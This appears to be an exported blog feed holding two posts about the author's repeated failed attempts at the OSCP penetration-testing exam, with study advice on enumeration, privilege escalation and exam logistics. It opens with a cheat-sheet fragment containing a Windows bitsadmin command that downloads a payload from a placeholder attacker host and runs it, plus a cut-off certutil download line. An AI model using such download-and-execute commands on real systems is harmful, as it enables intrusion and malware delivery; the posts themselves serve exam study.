&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Windows bitsadmin download &amp;amp; execute
cmd.exe /c &quot;bitsadmin /transfer eviljob /download /priority high http://attacker-ip:8888/payload.exe c:\payload.exe &amp;amp; start c:\payload.exe&quot;

# Windows Certutil.exe download a base64-encoded binary
certutil.exe -urlsplit -f


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>True Demon</name></author><summary type="html"></summary></entry><entry><title type="html">OSCP Journey Pt.2 - Close but no Cigar</title><link href="http://localhost:4000/2019/02/20/oscp-journey-2/" rel="alternate" type="text/html" title="OSCP Journey Pt.2 - Close but no Cigar" /><published>2019-02-20T11:33:00-05:00</published><updated>2019-02-20T11:33:00-05:00</updated><id>http://localhost:4000/2019/02/20/oscp-journey-2</id><content type="html" xml:base="http://localhost:4000/2019/02/20/oscp-journey-2/">&lt;figure class=&quot;&quot;&gt;
  &lt;img src=&quot;/images/posts/close-but-no.jpeg&quot; alt=&quot;&quot; /&gt;
  
&lt;/figure&gt;

&lt;p&gt;It’s been a while since my last post, having been working hard on my latest attempt at the OSCP and juggling work and college courses in the meanwhile. I thought that as my next and &lt;em&gt;hopefully&lt;/em&gt; last OSCP attempt approaches, that I might go over some of the additional things I’ve learned through my constant studying. If you didn’t see my post about my first attempt, you can check it out &lt;a href=&quot;../2018/2018-10-23-OSCP-Journey-Part-1&quot;&gt;here&lt;/a&gt;. I highly recommend it if you’re looking for some tips about things to avoid and the pitfalls I encountered while studying.&lt;/p&gt;

&lt;p&gt;The next three attempts at the OSCP were frustrating busts as well, but each attempt saw me getting closer and closer to passing. This time, I’ll cover some of the things I did right, but fell short anyway and why.&lt;/p&gt;

&lt;h2 id=&quot;prep-time&quot;&gt;Prep-Time&lt;/h2&gt;

&lt;p&gt;The second attempt at the exam, I decided to go for an additional 30 days of lab time, mostly because I was short on cash and at this point, I was obligated to pay on my own. Unlike before, I was hell-bent on spending several hours a day in the labs in order to prepare myself. Preparing for the OSCP, as I have said before, is something you have to dedicate enough time to in order to consider it a part-time job. It’s easier when you don’t have a job, school, and family to worry about all at the same time, which is why I advise newbies to go straight for the OSCP as soon as they have several months where they don’t know where to go next. In all, I spent about 3 hours a day on average, 5 days a week. Still slim compared to the amount of time one should be spending in the labs, but it was still a dramatic improvement over my last attempt.&lt;/p&gt;

&lt;p&gt;One of the things I did immediately once I got the chance was I scheduled my exam as soon as I was able to. With just 30 days in the lab, I knew I needed to schedule right away so that I would be taking the exam as soon as my lab access ended. In truth, the earliest I was able to schedule on a weekend was three weeks after the lab ended. Not ideal, but better than waiting over a month. With that, study time began.&lt;/p&gt;

&lt;h2 id=&quot;try-try-again--and-again&quot;&gt;Try, Try Again … and again&lt;/h2&gt;

&lt;p&gt;I subsequently attempted the OSCP three more times in the year following my first failure and still had not passed. Although I cannot comment precisely on the boxes themselves or the services I encountered, I think I can safely talk about some of the frustrating obstacles.&lt;/p&gt;

&lt;p&gt;During each of these attempts at the exam were my inability to step back from my tunnel vision and my failure to properly enumerate all parts of a machine to the point where I knew everything about them. I had a healthy mix of Windows and Linux systems between both exams, but one box (worth 25 points) in particular which I got on both was particularly frustrating and nigh impenetrable for me. Perhaps my biggest mistake was &lt;strong&gt;over-thinking&lt;/strong&gt; the boxes.&lt;/p&gt;

&lt;p&gt;It’s true what they say that the OSCP does not demand you be a genius. Nothing outlandish is expected of you. You are expected to do your own research, but the concepts covered in the courseware and labs essentially cover all of the fundamentals. If you have blitzed through the labs, all the way through to the Admin network, then owning the exam should be no sweat for you. Look for the obvious things, and you’re more likely to succeed.&lt;/p&gt;

&lt;p&gt;There’s no need to over-think it. Unfortunately, I didn’t learn this lesson quickly enough.&lt;/p&gt;

&lt;h3 id=&quot;the-proctored-exam&quot;&gt;The Proctored Exam&lt;/h3&gt;

&lt;p&gt;I had the rare experience of doing both the unproctored and proctored exams. My fourth exam attempt was a proctored one. Although I would say that the proctoring did not add any difficulty or pressure to the exam, it wasn’t without its issues.&lt;/p&gt;

&lt;p&gt;At the time of writing, the proctoring consists of a webcam session (no audio) and a screen-sharing session so that the proctor can view all of your monitors. The main purpose&lt;/p&gt;

&lt;p&gt;My biggest problem with the proctoring was the screen-sharing software OffSec uses, ScreenConnect, which is a product of ConnectWise, a product I was familiar with as a network administrator. When used with Linux, it uses a java binary to connect you to the session. Unfortunately, this product directly hooks the xorg server in a way that leads to problems. I found out through repeatedly encountering issues with ScreenConnect that it is extremely buggy if your host machine is a Linux distro with an X-Desktop environment such as GNOME.&lt;/p&gt;

&lt;p&gt;If the application closes, it will cause the xorg server to hang because it fails to detach itself properly, resulting in a frozen screen that you cannot recover from. The only option is a hard reboot. This isn’t OffSec’s fault obviously, but it did cause massive problems, especially due to the fact that ScreenConnect itself slowly bleeds memory over time, forcing you to eventually reset at some point.&lt;/p&gt;

&lt;p&gt;I was not able to test this with Windows, but in my past experience with the ScreenConnect software, I had not encountered a bug like this. I did report the issues I experienced to OffSec in hopes they will engage their vendors to fix the bug. Hopefully the problem is fixed for future exam takers, but be aware that if you are using a Linux host, there could be problems.&lt;/p&gt;

&lt;h3 id=&quot;network-problems--technical-difficulties&quot;&gt;Network Problems &amp;amp; Technical Difficulties&lt;/h3&gt;

&lt;p&gt;During each exam, I encountered network issues with the VPN, mostly with latency while port scanning. The connections don’t seem to be able to handle very much traffic simultaneously, so I learned quickly that you need to be very slow and methodical about your port scans, otherwise you’re likely to miss several things. It’s also quite frustrating to bang your head against the wall for hours only to find that the actual exploitable service was hidden on a different port number that your previous scans had missed.&lt;/p&gt;

&lt;p&gt;My fourth exam attempt was perhaps the most disastrous because of how close I came to success, but technical problems sealed my fate. It was my first proctored attempt at the exam, and it began with some network problems. The VPN wasn’t behaving properly due to how I had connected.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pro-Tip: Always start your VPN from the Kali VM in a terminal. Don’t configure it through GNOME or your host machine.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I wasted more than two hours because of less-than-obvious networking problems. Then, half-way through the exam, my laptop experienced a display driver failure because of DisplayLink, causing my monitors to fail. During multiple reboots in my attempts to fix it, my (POS Dell) laptop decided it would be a fantastic time to upgrade the BIOS for the next hour. Following that, half of my kernel modules did not work anymore, and I spent altogether a total of 6 hours trying to fix my laptop because I didn’t have a backup.&lt;/p&gt;

&lt;p&gt;With that said, &lt;strong&gt;I strongly advise having a backup computer!&lt;/strong&gt; You’ll suffer less for it. :(&lt;/p&gt;

&lt;h3 id=&quot;final-scores&quot;&gt;Final Scores&lt;/h3&gt;

&lt;p&gt;The final obstacle I ran into was with Privilege Escalation. It wasn’t that the escalations were too difficult, but rather I did not have all of the different techniques down to a science at that point. Even though I got access to all but one box each time, I was unable to gather enough points because I missed at least one crucial escalation vulnerability.&lt;/p&gt;

&lt;p&gt;My fourth attempt left me with only one privilege escalation standing between me and victory, before I ran out of time. I felt as though I was only minutes away from the escalation as well, which is perhaps the most frustrating failure I had experienced to date. So close and yet so far.&lt;/p&gt;

&lt;p&gt;In the end, on my second, third and fourth exam attempts, I estimate that I earned 65 points, assuming local-access to each 20-point box was worth 10 points for making it half way. I don’t know whether that is how the scoring scale works, since OffSec keeps that information under tight wraps, but I can’t help but speculate.&lt;/p&gt;

&lt;p&gt;Each time, I came &lt;strong&gt;so&lt;/strong&gt; close but just couldn’t get over the finish line.&lt;/p&gt;

&lt;p&gt;I can’t say definitively whether I was unprepared for each subsequent attempt. I came so close to passing each time that it almost felt like being cheated in a way, especially the fourth attempt. Part of me realizes that your results can change depending on the types of boxes you are given for each exam attempt.&lt;/p&gt;

&lt;p&gt;Sometimes you get lucky and see the same ones again, sometimes you get a full scramble of new hosts you’ve never seen. Some are harder than others to pop, even among the 25-point boxes. Sometimes the path to root is one of the first methods you check for, sometimes it’s the last think you’d think to try.&lt;/p&gt;

&lt;p&gt;That small measure of luck might make a 5% difference, but I know for a fact that the rest of it is all in your persistence, determination, and preparation – big emphasis on preparation.&lt;/p&gt;

&lt;p&gt;In the next part, I’ll cover preparation and avoiding common mistakes on the exam in hopes that it can help you prepare yourself better so you don’t have to face the exam a fifth time :P&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html"></summary></entry><entry><title type="html">OSCP Journey Pt.1 - How NOT to take the OSCP</title><link href="http://localhost:4000/2018/10/23/OSCP-Journey-Part-1/" rel="alternate" type="text/html" title="OSCP Journey Pt.1 - How NOT to take the OSCP" /><published>2018-10-23T00:00:00-04:00</published><updated>2018-10-23T00:00:00-04:00</updated><id>http://localhost:4000/2018/10/23/OSCP-Journey-Part-1</id><content type="html" xml:base="http://localhost:4000/2018/10/23/OSCP-Journey-Part-1/">&lt;figure class=&quot;&quot;&gt;
  &lt;img src=&quot;/images/posts/offsec-try-harder.png&quot; alt=&quot;&quot; /&gt;
  
&lt;/figure&gt;

&lt;p&gt;I feel like this post has been long overdue given how long I’ve been chasing this dream of earning my OSCP. I officially started the course in February of 2017. So far, &lt;u&gt;I have taken and failed the exam a total of three times&lt;/u&gt; despite approaching each attempt feeling profoundly confident that I would pass. Having proven myself wrong for the third time, I’m not going into this upcoming, fourth attempt with any assumptions anymore. I’m too cynical and exhausted by repeated failure for that. I’ve been humbled each time, so now I’m going to attack it with a different attitude. I’m completely starting over.&lt;/p&gt;

&lt;p&gt;If there is one thing I’ve learned from the OSCP, it’s how to embrace your failures and grow from them. Believe me, each time I screwed up was &lt;em&gt;NOT&lt;/em&gt; an easy pill to swallow. Unfortunately, I don’t see many other OSCP journeys that really talk about this… Maybe that’s because most of them took it seriously enough that they didn’t have to fail as hard as I did. Regardless of the reasons, I feel it’s important to recognize when you failed and figure out how to recover, and I spent a lot of time failing. Given it’s been such a long journey for me, probably longer than most, I thought it would be a wasted opportunity if I didn’t share my experience with everyone else.&lt;/p&gt;

&lt;p&gt;So … &lt;em&gt;-sigh-&lt;/em&gt; here it goes.&lt;/p&gt;

&lt;h1 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h1&gt;

&lt;p&gt;I started my OSCP journey on the dime of my former employer who was kind enough to give me a $1,200 spot to earn this highly respected certification that I’d been practically &lt;em&gt;drooling&lt;/em&gt; over since I discovered it in high school (c. 2008). I went all out. Bought the courseware, 90 days of lab time, and got started burning the midnight oil trying to own every single box systematically that I could … for about a week.&lt;/p&gt;

&lt;p&gt;After the first seven days, I quickly got exhausted and let myself get lazy. I started focusing more on work, learning from the experiences of my new colleagues who were veteran penetration testers. This brought their own rewards, but it heavily distracted my from my pursuit of the OSCP. Taking online college courses at the same time didn’t help either. Ultimately, I maybe exploited a total of 15 or fewer boxes in my first attempt before exam time. Given that I had bought 90 days, &lt;strong&gt;this was a tremendous waste of time and money&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Something else that I did wrong that I never corrected until recently is, &lt;em&gt;I made the mistake of not using the PWK VM image&lt;/em&gt;. This critical error in my judgment, actively choosing to ignore the advice of the people who built the OSCP and PWK course, may have cost me more than the time I wasted by not spending it in the labs.&lt;/p&gt;

&lt;h2 id=&quot;exam-1&quot;&gt;&lt;strong&gt;Exam 1&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Come exam day, I was thoroughly unprepared. I didn’t schedule it until my lab time was about to expire, so this was approximately 1.5 months after my lab access ended. Let me emphasize that this was exceedingly stupid of me. That was 1.5 months I spent sitting on my ass, stressing about an exam I could no longer adequately prepare myself for without buying more lab time with money I did not have.&lt;/p&gt;

&lt;p&gt;Second mistake, I scheduled it starting at 5PM local time. I had been up for half the day already, already caffeinated with two cups of coffee, and entirely too overconfident in myself.&lt;/p&gt;

&lt;h3 id=&quot;first-box-down&quot;&gt;First box down&lt;/h3&gt;
&lt;p&gt;By the first 2 hours I successfully took down my buffer overflow box despite issues connecting to the VPN. I was feeling very good about this, and thought I had it in the bag. In reality, this was an easy 25 points I was &lt;strong&gt;expected&lt;/strong&gt; to get easily. The buffer overflow, while a difficult concept to grasp initially, is probably one of the easiest boxes to exploit once you know how to do it. Abusing a stack overflow flaw, once learned, is like riding a bike. Just in case you forget or haven’t learned yet though, here’s a link to the &lt;a href=&quot;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&quot;&gt;Corelan Blog&lt;/a&gt;, recommended to me by &lt;a href=&quot;https://zerosteiner.com/&quot;&gt;@ZeroSteiner&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Despite feeling pretty good about my first (easy) 25 points, this would be the end of the easy for me. From here, the points came slow and painful.&lt;/p&gt;

&lt;h3 id=&quot;eight-hours-in--starting-to-lose-confidence&quot;&gt;Eight hours in … starting to lose confidence&lt;/h3&gt;
&lt;p&gt;Six hours since my last set of points being earned, I was beginning to stress about the outcome. I realized I had not nearly prepared myself with knowledge on service enumeration at this point, and I was running the same tools over and over expecting some different magic to happen.&lt;/p&gt;

&lt;p&gt;When suddenly &lt;em&gt;-gasp-&lt;/em&gt; … another shell!&lt;/p&gt;

&lt;p&gt;After digging through a static website on the box I was targeting, I came across some information that led me to start extending my port scanning a little bit. I managed to come across an obscure service running on an obscure port with an &lt;em&gt;exceedingly&lt;/em&gt; well documented exploit. Despite it being 10 hours after my exam began and already feeling slightly defeated, this put some wind in my sails. It was the confidence boost I needed to continue. Unfortunately, it would be short-lived.&lt;/p&gt;

&lt;p&gt;After getting my limited shell … I promptly lost it by running a command that would never end. I tried re-exploiting to no avail because I had locked the thread I was in, and there was no getting it back without restarting the running service. I would be forced to spend a revert.&lt;/p&gt;

&lt;p&gt;After three more reverts because of repeatedly making the same stupid mistakes, I realized I was getting no where. I burned my one-time Metasploit token to get a more stable shell, but even that did very little to help. For whatever reason, meterpreter would not work. I wasted an hour trying to make meterpreter work because I thought it would save me somehow. When that failed, I fell back to a more stable but featureless perl shell.&lt;/p&gt;

&lt;p&gt;I found myself uploading useless tools that offered me no help, because I had not worked hard enough learning privilege escalation that otherwise should have been easy. After another three hours wasted and only a local.txt proof file to show for it, I dejectedly went to attack my 10-point box.&lt;/p&gt;

&lt;h3 id=&quot;burn-out&quot;&gt;Burn-out&lt;/h3&gt;
&lt;p&gt;I am at 16 hours awake. I’ve guzzled two Monster Rehab energy drinks, and three cups of coffee at this point. No sleep, and only one break for a cheeseburger from the local fast food joint. The 10 point box has yet to yield itself to me, and I am starting to feel the pressure of the clock on me.&lt;/p&gt;

&lt;p&gt;I’d spent hours chasing a vulnerability on the 25-point box that, although it was the correct one, I did not know how to think for myself enough to modify my exploit and leverage a shell. I walk away from the 25-point box with only 6 hours left in my exam. My eyes burn, my fingers feel numb, and my head is in agony, begging for me to pop 1000mg of Ibuprofen and go to bed while my hands shake from the absolute overdose of caffeine I was experiencing.&lt;/p&gt;

&lt;p&gt;I tried and failed to sleep for more than an hour, lying wide-eyed awake and literally vibrating from the level of caffeine in my system. I give up on trying to sleep and drag myself back to my computer. Things were &lt;em&gt;not&lt;/em&gt; going according to plan…&lt;/p&gt;

&lt;h3 id=&quot;20-hours--panic-sets-in&quot;&gt;20 hours … Panic sets in&lt;/h3&gt;

&lt;p&gt;At this point I know I am going to fail. I have less than 4 hours and have not seen a shell since my last session on the 20-point box (which is still alive). I bounced around every machine, including my local shell, retrying things that I thought I could modify before quickly giving up and going to another machine.&lt;/p&gt;

&lt;p&gt;I am looking … begging … for one of these systems to give me a shell, but it never comes.&lt;/p&gt;

&lt;p&gt;I look up at the clock after staring at a blank terminal for almost 30 minutes in a foggy haze and see that I have less than 20 minutes before my lab access ends. I decided that was the end, and I couldn’t go any further. I crawled into my bed a shell of the man I was, too exhausted to think or come to terms with my failure.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“It’s over… I didn’t try hard enough…”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I started writing my report 20 hours later after spending 14 of them sleeping. I knew full well it would be pointless. I had not created a lab report. I didn’t even collect any evidence. I was so certain it wouldn’t be needed. In truth, it wasn’t, because it wouldn’t make a difference. I failed hard. After turning in my exam report, I crawled back into bed for another day.&lt;/p&gt;

&lt;h3 id=&quot;exam-1-scoreboard&quot;&gt;Exam 1 Scoreboard&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Box&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Access&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Buffer Overflow&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Root&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;25 points&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;25-point box&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;None&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;0 points&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;20-point box 1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Local&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;~10 points?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;20-point box 2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;None&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;0 points&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10-point box&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;None&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;0 points&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lab Report&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;None&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;0 Points&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Final Score&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;—&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;strong&gt;~ 35 Points&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Status&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;—&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;strong&gt;Annihilated&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Judgement&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;—&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;strong&gt;You suck … Try Harder&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;I have never cried myself to sleep. But there’s a first for everything I suppose…&lt;/p&gt;

&lt;p&gt;The OSCP ate me alive like a predator to their prey, and I never felt lower or more humiliated for ever feeling confident in my skills as a hacker. As far as I knew, I had none. If you are reading this after failing, trust me when I say I know &lt;em&gt;exactly&lt;/em&gt; how you feel… along with 60%+ of exam takers who also failed at least once.&lt;/p&gt;

&lt;p&gt;I spent well over a week recovering physically and mentally … and emotionally before I was ready to re-assess what went so horribly wrong…&lt;/p&gt;

&lt;h2 id=&quot;everything-that-went-so-horribly-wrong&quot;&gt;&lt;strong&gt;Everything that went so horribly wrong&lt;/strong&gt;…&lt;/h2&gt;

&lt;p&gt;I told you at the beginning that this would be about embracing failure, so I’m going to be up front and lay all of mine on the table for you. Ultimately, &lt;strong&gt;I made seven major errors&lt;/strong&gt; that led to my inevitable failure during my first attempt. If you can avoid making them yourself, you will be better prepared.&lt;/p&gt;

&lt;h3 id=&quot;1-i-ignored-the-pwk-courses-no1-recommendation&quot;&gt;1: I ignored the PWK course’s No.1 recommendation&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;“USE THE VM WE GAVE YOU!”“&lt;/strong&gt;&lt;br /&gt;
 –  OSCP devs&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The Pentesting with Kali VM is there for a reason. It says it right there in the description &lt;em&gt;it is built specifically for the lab environment and the exam.&lt;/em&gt; This is for many reasons, but chiefly among them, the VM is built with an i686 architecture. If that doesn’t strike you as weird, it should. Much of the lab and certain exam machines depend on using compiled exploits that you will need to be able to figure out how to compile on your own. I will emphasize &lt;em&gt;compiling exploits is f0rkin’ hard&lt;/em&gt; if you don’t know anything about C, compiled languages, or the gcc compiler and it’s near-infinite number of flags.&lt;/p&gt;

&lt;p&gt;Because the exploits you’ll use in both the lab and exam will almost certainly fail if not compiled correctly, the all-knowing OSCP overseers graced us with a VM that comes with everything we need. &lt;strong&gt;The PWK VM is built to compile all exploits correctly&lt;/strong&gt; with all the necessary libraries already included. Worst-case scenario, you may run into some compilation errors that can be fixed with minor tweaks to the exploits, adjusting some shellcode, or adjusting some well-documented compiler flags. In most almost every case, the exploit should compile without any flags at all, otherwise you will find it with some prime-choice googling.&lt;/p&gt;

&lt;p&gt;The course says, &lt;em&gt;“Use a custom image at your own risk.”&lt;/em&gt;&lt;br /&gt;
  I say, &lt;em&gt;“PWK VM or bust!”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In addition, don’t update the VM either.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get dist-upgrade&lt;/code&gt; &lt;em&gt;is a dangerous gamble!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I later discovered that several tools in the VM will break after updating them thanks to some drastic changes that have been done to the main Kali Rolling disto that will not translate correctly in the PWK VM. It was built the way it was for a good reason. Use it and don’t change it. You may unknowingly break something that was intended to help you pass the exam.&lt;/p&gt;

&lt;p&gt;Don’t try to be a smart guy like me. Get the PWK VM, step outside your comfort zone, resist any temptation to screw with it, and use it as it was intended. It may make the difference between success and failure. You don’t need the newest, shiniest updates.&lt;/p&gt;

&lt;p&gt;Just tell yourself… &lt;img src=&quot;/images/posts/idontneedit.jpg&quot; alt=&quot;&quot; width=&quot;200px&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-i-did-not-plan-enough-downtime-to-dedicate-to-the-course&quot;&gt;2: I did not plan enough downtime to dedicate to the course&lt;/h3&gt;
&lt;p&gt;This is probably the primary cardinal sin of all who attempt the OSCP and failed. Life often gets in the way, but for a lot of us, we allow ourselves to get lazy or distracted from our goal. The OSCP is no joke, and if you allow yourself to get overconfident, think you’ve got it in the bag, and don’t give it the amount of study it deserves, you will inevitably lose.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;At a minimum, I should have been spending 4 hours per day in the labs. Instead, I maybe did a handful of hours per week on average.&lt;/li&gt;
  &lt;li&gt;If you are in school like I was, put it on hiatus or wait until you’re finished. You just can’t do both…&lt;/li&gt;
  &lt;li&gt;If you are working a full time job like I was, you need to make sacrifices. No games, no playtime. There are only the labs. That’s your life now until your exam day.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;3-i-did-not-spend-enough-time-learning-how-to-enumerate-and-escalate&quot;&gt;3: I did not spend enough time learning how to enumerate and escalate&lt;/h3&gt;
&lt;p&gt;This may seem like an obvious one, but learn the tools they’ve given you. Many of the machines in the labs and the exam force you to enumerate &lt;em&gt;several&lt;/em&gt; services. If you spend all of your time digging for an easy 1-2-3 RCE exploit, you’re only going to hit maybe 10% of the labs, and you will definitely fail your exam.&lt;/p&gt;

&lt;p&gt;Worse yet, most of the exam boxes will require you to escalate your privileges in some way. In the real world, this can be just as difficult or more-so than what you experience in the OSCP exam. You &lt;em&gt;must&lt;/em&gt; be capable of using tools that pale in comparison to the functionality of Metasploit and other escalation tools and still be equally successful.&lt;/p&gt;

&lt;p&gt;Learn how to produce &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;shells&lt;/a&gt;, &lt;a href=&quot;https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/&quot;&gt;upload/download&lt;/a&gt; files, and &lt;a href=&quot;https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumeration--attacking-network-services&quot;&gt;enumerate&lt;/a&gt; users, groups, services, and processes with native OS command line. This includes &lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot;&gt;Windows&lt;/a&gt; and &lt;a href=&quot;https://payatu.com/guide-linux-privilege-escalation/&quot;&gt;Linux&lt;/a&gt;. If you’re a Linux guru, half the work is done for you, but Windows Escalation proved to be my worst nightmare. Tools like wget, curl, netcat … those don’t exist in the Windows world.&lt;/p&gt;

&lt;p&gt;I strongly advise learning the Linux CLI until you’re a champ at it. Make it a daily exercise to learn a new tool and learn to read the &lt;em&gt;man pages&lt;/em&gt;. For Windows, keep the &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/&quot;&gt;&lt;strong&gt;Windows SysInternals&lt;/strong&gt;&lt;/a&gt; tools close at hand, particularly …&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;AccessChk.exe&lt;/li&gt;
  &lt;li&gt;ShareEnum&lt;/li&gt;
  &lt;li&gt;ProcDump&lt;/li&gt;
  &lt;li&gt;PsExec&lt;/li&gt;
  &lt;li&gt;LogonSessions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In addition, any of the major things you do in Linux escalation, you should learn how to do from Windows command line, like file &amp;amp; string grepping, listing processes, string concatenation, echoing streams to files, listing users, groups, shares, permissions and running services/processes. All of that comes into play come exam time.&lt;/p&gt;

&lt;h3 id=&quot;4-i-tried-to-be-an-army-of-one&quot;&gt;4: I tried to be an Army of One&lt;/h3&gt;
&lt;p&gt;Instead of looking to other people for advice, going to the OSCP forums, or asking questions in the IRC, I tried to be the cool kid who could figure it out all by his bad-ass self. Well, I didn’t, and I failed miserably in my first attempt because I was too cool for school. Don’t pretend you’ll get it on your own, because if you learn from your predecessor’s mistakes, you can avoid making them yourself and save yourself a lot of heartache (and money.)&lt;/p&gt;

&lt;p&gt;Take the time to set yourself up in the OSCP’s official forums, IRC, and the &lt;a href=&quot;https://netsecfocus.herokuapp.com/&quot;&gt;NetSec Focus OSCP Slack channel&lt;/a&gt;. The information there is invaluable, and you can always ask questions (or look at the questions of others) when you eventually get stuck. Sometimes just talking to someone about it will kickstart something in your mind that leads you in the right direction. I can speak from experience that nobody wants to spoil it for you, so don’t expect people to just give you the answer. You should neither be nor expect to be spoon-fed. That’s now how you get good at hacking. As Yoda put it …&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Do, or do not. There is no “Try.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;5-i-attacked-the-network-like-a-to-do-list-not-a-pentester&quot;&gt;5: I attacked the network like a to-do list, not a pentester&lt;/h3&gt;

&lt;p&gt;I made this mistake repeatedly throughout the course, but the lab is a wide open network meant to simulate a realistic environment. Even though you’ll probably start by listing targets according to their IP address, don’t be tempted to attack them in that order.&lt;/p&gt;

&lt;p&gt;The environment offers a lot of machines with varying challenges and opportunities to learn new ways of exploiting system flaws. Your time spent going after them should be organic in that you attack things that catch your interest or require you to take a different approach than you are accustomed to. This is part of how the OSCP makes you evolve as a pentester, so you should let it happen that way.&lt;/p&gt;

&lt;p&gt;A few extra tidbits for attacking the lab as to best prepare for the exam…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Don’t rely on automated scanning tools. Nessus and OpenVAS are great, but they will give you tunnel vision on many of the hosts you attack. It’s also bad form to implicitly trust scanners to deliver you low-hanging fruit, because you will never force yourself to try and find things that the scanner can’t. This will cripple you for the exam AND as a penetration tester.&lt;/li&gt;
  &lt;li&gt;Force yourself to put Metasploit away. You can use it the first couple of times you exploit something, but ultimately you aren’t going to have it in the exams. Once you successfully root a box, repeat the process using tools outside of Metasploit. Use the Nmap NSE scripts, as well as other enumeration tools to enumerate services, and learn how to compile, upload, deploy, and execute exploits without Metasploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You still need msfvenom to generate shellcode, but the majority of the framework will be off limits to you, so learn how to survive without it. When your box of survival gear gets taken away during the exam, all you’re going to be left with are your rocks and sticks, so you’ll need to learn to craft your own tools in the wild anyway. Best to be prepared.&lt;/p&gt;

&lt;h3 id=&quot;6-i-did-not-schedule-in-advance&quot;&gt;6: I did not schedule in advance&lt;/h3&gt;

&lt;p&gt;By the time I scheduled my exam, my lab access was coming to an end. Like a moron, I thought I could just schedule it for the following week no problem. As it turns out, the exams for OSCP are typically booked for upwards of a month from the current date, so you &lt;strong&gt;MUST&lt;/strong&gt; schedule it in advance.&lt;/p&gt;

&lt;p&gt;There is nothing worse than spending months in the labs and then having to wait another month just to take a crack at the exam. Schedule ahead so that you take an exam attempt almost immediately after the labs, around 1 week is usually sufficient. This will give you a chance to script up some useful tools and mentally prepare yourself for exam day.&lt;/p&gt;

&lt;p&gt;An extra added piece of advice… take the exam whether you think you’re ready or not. You have nothing to loose because you’ll need to purchase more lab time, which comes with a complementary exam attempt.&lt;/p&gt;

&lt;p&gt;Don’t waste the chance and go for the exam, even if you don’t feel ready. Taking the exam is the best way to prepare for it, and although it’s not impossible to pass the first time, the odds indeed are against you.&lt;/p&gt;

